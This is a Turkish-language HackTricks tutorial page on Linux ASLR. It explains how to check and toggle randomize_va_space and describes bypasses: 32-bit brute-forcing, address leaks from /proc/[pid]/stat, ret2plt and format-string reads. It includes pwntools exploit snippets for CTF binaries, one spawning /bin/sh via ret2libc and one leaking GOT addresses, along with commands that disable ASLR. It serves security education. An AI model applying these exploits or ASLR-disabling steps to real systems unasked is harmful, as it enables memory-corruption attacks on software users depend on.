# ASLR

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Temel Bilgiler

**Adres Alanı Düzeni Rastgeleleştirme (ASLR)**, işletim sistemlerinde kullanılan bir güvenlik tekniğidir ve **sistem ve uygulama süreçleri tarafından kullanılan bellek adreslerini rastgeleleştirir**. Bu sayede, bir saldırganın belirli süreçlerin ve verilerin, örneğin yığın, yığın alanı ve kütüphaneler gibi, konumunu tahmin etmesini önemli ölçüde zorlaştırır ve böylece belirli türdeki istismarları, özellikle de tampon taşmalarını azaltır.

### **ASLR Durumunu Kontrol Etme**

Bir Linux sisteminde ASLR durumunu **kontrol etmek için**, `/proc/sys/kernel/randomize_va_space` dosyasındaki değeri okuyabilirsiniz. Bu dosyada saklanan değer, uygulanan ASLR türünü belirler:

* **0**: Rastgeleleştirme yok. Her şey statik.
* **1**: İhtiyatlı rastgeleleştirme. Paylaşılan kütüphaneler, yığın, mmap(), VDSO sayfası rastgeleleştirilmiştir.
* **2**: Tam rastgeleleştirme. İhtiyatlı rastgeleleştirme ile rastgeleleştirilen unsurlara ek olarak, `brk()` ile yönetilen bellek rastgeleleştirilmiştir.

ASLR durumunu kontrol etmek için aşağıdaki komutu kullanabilirsiniz:
```bash
cat /proc/sys/kernel/randomize_va_space
```
### **ASLR'yi Devre Dışı Bırakma**

ASLR'yi **devre dışı bırakmak** için `/proc/sys/kernel/randomize_va_space` değerini **0** olarak ayarlarsınız. ASLR'yi devre dışı bırakmak, genellikle test veya hata ayıklama senaryoları dışında önerilmez. İşte bunu nasıl yapabileceğiniz:
```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```
ASLR'yi bir yürütme için devre dışı bırakmak için de şunu kullanabilirsiniz:
```bash
setarch `arch` -R ./bin args
setarch `uname -m` -R ./bin args
```
### **ASLR'yi Etkinleştirme**

ASLR'yi **etkinleştirmek** için, `/proc/sys/kernel/randomize_va_space` dosyasına **2** değerini yazabilirsiniz. Bu genellikle root ayrıcalıkları gerektirir. Tam rastgeleleştirme, aşağıdaki komutla yapılabilir:
```bash
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
```
### **Yeniden Başlatmalar Arasında Süreklilik**

`echo` komutlarıyla yapılan değişiklikler geçicidir ve yeniden başlatıldığında sıfırlanır. Değişikliği kalıcı hale getirmek için, `/etc/sysctl.conf` dosyasını düzenlemeniz ve aşağıdaki satırı eklemeniz veya değiştirmeniz gerekir:
```tsconfig
kernel.randomize_va_space=2 # Enable ASLR
# or
kernel.randomize_va_space=0 # Disable ASLR
```
Değişiklikleri uygulamak için `/etc/sysctl.conf` dosyasını düzenledikten sonra:
```bash
sudo sysctl -p
```
Bu, ASLR ayarlarınızın yeniden başlatmalar arasında kalmasını sağlayacaktır.

## **Atlatmalar**

### 32bit brute-forcing

PaX, işlem adres alanını **3 gruba** ayırır:

* **Kod ve veri** (başlatılmış ve başlatılmamış): `.text`, `.data` ve `.bss` —> `delta_exec` değişkeninde **16 bit** entropi. Bu değişken, her işlemle rastgele başlatılır ve başlangıç adreslerine eklenir.
* `mmap()` ile tahsis edilen **bellek** ve **paylaşılan kütüphaneler** —> **16 bit**, `delta_mmap` olarak adlandırılır.
* **Yığın** —> **24 bit**, `delta_stack` olarak adlandırılır. Ancak, etkili olarak **11 bit** kullanır (10. bayttan 20. bayta kadar dahil), **16 bayt** hizalanmış —> Bu, **524,288 olası gerçek yığın adresi** ile sonuçlanır.

Önceki veriler 32-bit sistemler içindir ve azaltılmış nihai entropi, istismar başarılı bir şekilde tamamlanana kadar yürütmeyi tekrar tekrar denemek suretiyle ASLR'yi atlatmayı mümkün kılar.

#### Brute-force fikirleri:

* Eğer shellcode'dan önce **büyük bir NOP kaydı** barındıracak kadar büyük bir taşma varsa, yığında adresleri brute-force ile deneyebilirsiniz, ta ki akış **NOP kaydının bir kısmının üzerinden atlayana kadar**.
* Taşma o kadar büyük değilse ve istismar yerel olarak çalıştırılabiliyorsa, **NOP kaydını ve shellcode'u bir ortam değişkenine eklemek** mümkündür.
* Eğer istismar yerel ise, libc'nin temel adresini brute-force ile denemeyi deneyebilirsiniz (32bit sistemler için yararlıdır):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* Eğer uzaktaki bir sunucuya saldırıyorsanız, **`usleep`** `libc` fonksiyonunun adresini **brute-force** etmeyi deneyebilirsiniz, argüman olarak 10 (örneğin) geçerek. Eğer bir noktada **sunucu yanıt vermek için 10 saniye ekstra alıyorsa**, bu fonksiyonun adresini bulmuşsunuzdur.

{% hint style="success" %}
64 bit sistemlerde entropi çok daha yüksektir ve bu mümkün değildir.
{% endhint %}

### Yerel Bilgiler (`/proc/[pid]/stat`)

Bir sürecin **`/proc/[pid]/stat`** dosyası her zaman herkes tarafından okunabilir ve **ilginç** bilgiler içerir, örneğin:

* **startcode** & **endcode**: İkili dosyanın **TEXT**'inin üstünde ve altında bulunan adresler
* **startstack**: **stack**'in başlangıç adresi
* **start\_data** & **end\_data**: **BSS**'nin üstünde ve altında bulunan adresler
* **kstkesp** & **kstkeip**: Mevcut **ESP** ve **EIP** adresleri
* **arg\_start** & **arg\_end**: **cli argümanlarının** üstünde ve altında bulunan adresler.
* **env\_start** & **env\_end**: **env değişkenlerinin** üstünde ve altında bulunan adresler.

Bu nedenle, eğer saldırgan, istismar edilen ikili dosyanın bulunduğu bilgisayarda ise ve bu ikili dosya ham argümanlardan taşmayı beklemiyorsa, ancak bu dosyayı okuduktan sonra oluşturulabilecek farklı bir **girdi** üzerinden bekliyorsa, bir saldırganın **bu dosyadan bazı adresleri alması ve bunlardan istismar için ofsetler oluşturması mümkündür**.

{% hint style="success" %}
Bu dosya hakkında daha fazla bilgi için [https://man7.org/linux/man-pages/man5/proc.5.html](https://man7.org/linux/man-pages/man5/proc.5.html) adresinde `/proc/pid/stat` araması yapın.
{% endhint %}

### Bir leak'e sahip olmak

* **Zorluk bir leak vermektir**

Eğer size bir leak verilirse (kolay CTF zorlukları), ondan ofsetleri hesaplayabilirsiniz (örneğin, istismar ettiğiniz sistemde kullanılan tam libc sürümünü bildiğinizi varsayarak). Bu örnek istismar, [**buradan alınmıştır**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/aslr-bypass-with-given-leak) (daha fazla ayrıntı için o sayfaya bakın):
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvuntil('at: ')
system_leak = int(p.recvline(), 16)

libc.address = system_leak - libc.sym['system']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
0x0,        # return address
next(libc.search(b'/bin/sh'))
)

p.sendline(payload)

p.interactive()
```
* **ret2plt**

Bir buffer overflow kullanarak, libc'den bir fonksiyonun adresini dışarı sızdırmak için bir **ret2plt** istismar etmek mümkün olacaktır. Kontrol et:

{% content-ref url="ret2plt.md" %}
[ret2plt.md](ret2plt.md)
{% endcontent-ref %}

* **Format Strings Arbitrary Read**

ret2plt'de olduğu gibi, eğer bir format string zafiyeti aracılığıyla rastgele bir okuma varsa, GOT'dan bir **libc fonksiyonu** adresini dışarı sızdırmak mümkündür. Aşağıdaki [**örnek buradan alınmıştır**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt\_and\_got):
```python
payload = p32(elf.got['puts'])  # p64() if 64-bit
payload += b'|'
payload += b'%3$s'              # The third parameter points at the start of the buffer

# this part is only relevant if you need to call the main function again

payload = payload.ljust(40, b'A')   # 40 is the offset until you're overwriting the instruction pointer
payload += p32(elf.symbols['main'])
```
Daha fazla bilgi için Format Strings arbitrary read hakkında şunları bulabilirsiniz:

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}

### Ret2ret & Ret2pop

ASLR'yi, yığın içindeki adresleri kullanarak atlatmayı deneyin:

{% content-ref url="../../stack-overflow/ret2ret.md" %}
[ret2ret.md](../../stack-overflow/ret2ret.md)
{% endcontent-ref %}

{% hint style="success" %}
AWS Hacking öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'ı takip edin.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}
